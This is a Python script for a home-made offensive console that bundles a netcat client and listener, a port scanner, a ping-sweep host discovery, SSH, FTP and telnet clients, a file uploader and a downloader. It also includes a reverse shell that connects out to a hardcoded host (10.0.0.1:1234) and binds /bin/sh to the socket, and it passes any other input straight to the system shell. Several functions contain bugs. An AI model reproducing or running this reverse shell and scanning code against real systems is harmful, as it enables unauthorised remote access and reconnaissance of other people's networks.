import os
import requests 
import urllib
import sys
import socket
import time
import subprocess
from  paramiko import SSHClient, SFTPClient
import paramiko
from ftplib import FTP
import telnetlib 
from getpass import getpass

def listcommands():
    print("                     help screen                                  ")
    print("=======================================================")
    print("nc \t \t opens a netcat connection to port and address")
    print("ncserver \t \t opens a netcat listner ")
    print("wgetf \t \t gets a file from a url")
    print("ssh \t \t create ssh connection")
    print("ftp \t \t connect with password to ftp server")
    print("portscan \t \t scan a host for open ports")
    print("telnet \t \t opens a telnet connection")
    print("rshell \t \t opens a reverse shell")
    print("hostdiscover \t \t looks for all hosts in your network")
    print("=======================================================")
    print()

def GetRealIp():
    return  requests.get('https://api.ipify.org').text

def uploadfile(inp):
    try:
        f = open(inp.split(' ')[1],'r')
        sock = socket.socket()
        sock.connect((inp.split(' ')[2],int(inp.split(' ')[3])))
    except Exception:
        print("[!] usage upload <fname> <ipaddr> <port>")
    try:
        bytes = sock.sendfile(f)
        print("file sent: " + str(bytes))
    except Exception as e:
        print(e)

def wgetfile(inp):    
    try:
        url = inp.split(" ")[1]
    except Exception:
        print("[!] usage wget http://host.org/file.name")
    try:
        urllib.urlretrieve(url,url.split("/")[-1])
    except Exception as e:
        print(e)

def hostdiscover(inp):
    livehosts = []    
    try:
        url = inp.split(' ')[1]
    except Exception:
        print("[!] usage hostdicover local.ip.addr.0")
        return None
    print("[+] looking for live hosts...")
    for i in range(1,254):
        if os.system("ping " + str(url[:-1]) + str(i) + " -n 1 -w 30") == 0:
            livehosts.append(str(url[:-1]) + str(i))
    for hosts in livehosts:
        print(hosts)

def portscan(inp):
    try:
        openports = []
        addr = inp.split(' ')[1]
        if '-' in inp:
            portrange = inp.split(" ")[2]
            for port in range(int(portrange.split("-")[0]),int(portrange.split("-")[1])):
                sock = socket.socket()
                res = sock.connect_ex((addr,port))
                if res == 0:
                    openports.append(port)
        else:
            for port in range(1,1025):
                sock = socket.socket()
                res = sock.connect_ex((addr,port))
                if res == 0:
                    openports.append(port)
        for ports in openports:
            print("[+] port number:" + port + "is open in host:" + addr)
    except IndexError:
        print("[!] usage is portscan <addr> <portrange> optionl")
        return None
    except Exception as e:
        print(e)

def ssh(inp):
    try:
        print("enter password: ")
        password = getpass(prompt="")
        username = (inp.split('@')[0])[4:]
        addr = inp.split('@')[1]
    except Exception:
        print("[!] usage ssh <user>@<serveraddr>")
        return None
    try:
        client = SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(addr,username=username,password=password)
        client.invoke_shell()
    except Exception as e:
        print(e)

def netcat(inp):
    try:
        addr = inp.split(" ")[1]
        port = inp.split(" ")[2]
    except Exception:
        print("[!] useage nc <address> <port>")
    try:
        sock = socket.socket()
        sock.connect((addr,int(port)))
        print("[+] connection has been established")
        while 1:
            senddata = input(">")
            if senddata == "exit": sock.close(); break
            sock.send(senddata.encode())
            data = sock.recv(1024)
            print(repr(data))
    except Exception as e:
        print(e)

def netcatserver(inp):
    try:
        port = int(inp.split(' ')[1])
    except Exception:
        print("[!] useage ncserver <port>")
    try:
        sock = socket.socket()
        sock.bind(('0.0.0.0',port))
        sock.listen(1)
        conn , (addr,port) = sock.accept()
        print("[+] connection from: " + addr)
        while 1:
            data = conn.recv(1024)
            print(repr(data))
            if not data: break
            senddata = input(">")
            if senddata == "exit": break
            conn.sendall(senddata.encode())
        conn.close()
    except Exception as e:
        print(e)

def ftpclient(inp):
    try:
        ftp = FTP(inp.split(' '))
    except Exception:
        print("[!] useage ftp <serveraddr>")
    username = input("enter username: ")
    password = input("enter password: ")
    try:
        ftp.login(username,password)
        print("[+] connection has been established")
        while 1:
            cmd = input(">")
            if cmd == "exit":break
            ftp.sendcmd(cmd)
    except Exception as e:
        print(e)

def reverseshell(inp):
    try:
        addr = inp.split(' ')[1]
        port = inp.split(' ')[2]
    except Exception:
        print("[!] useage rshell <addr> <port>")
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.0.0.1",1234))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])
    except Exception as e:
        print(e)

def telnet(inp):
    try:
        addr = inp.split(' ')[1]
        port = int(inp.split(' ')[2])
    except Exception:
        print("[!] usage telnet <addr> <port>")
    client = telnetlib.Telnet(addr,port)
    client.interact()

def handler(inp):
    inp = str(inp)
    if inp.startswith("nc "):
        netcat(inp)
        return None
    elif inp.startswith("wgetf"):
        wgetfile(inp)
        return None
    elif inp.startswith("ncserver"):
        netcatserver(inp)
        return None
    elif inp.startswith("ssh"):
        ssh(inp)
        return None
    elif inp.startswith("ftp"):
        ftpclient(inp)
        return None
    elif inp.startswith("portscan"):
        portscan(inp)
        return None
    elif inp.startswith("telnet"):
        telnet(inp)
        return None
    elif inp.startswith("rshell"):
        reverseshell(inp)
        return None
    elif inp.startswith("hostdiscover"):
        hostdiscover(inp)
        return None
    elif inp.startswith("pubip"):
        GetRealIp()        
        return None
    elif inp.startswith("exit"):
        sys.exit()
    elif inp.startswith("list") or inp.startswith("help"):
        listcommands()
    else:
        p = subprocess.Popen(inp,shell=True)

def Console():
    while 1:        
        pwd = subprocess.check_output("cd",shell=True)
        print()
        print()
        handler(input(str(pwd) +  ">"))
        time.sleep(0.5)


Console()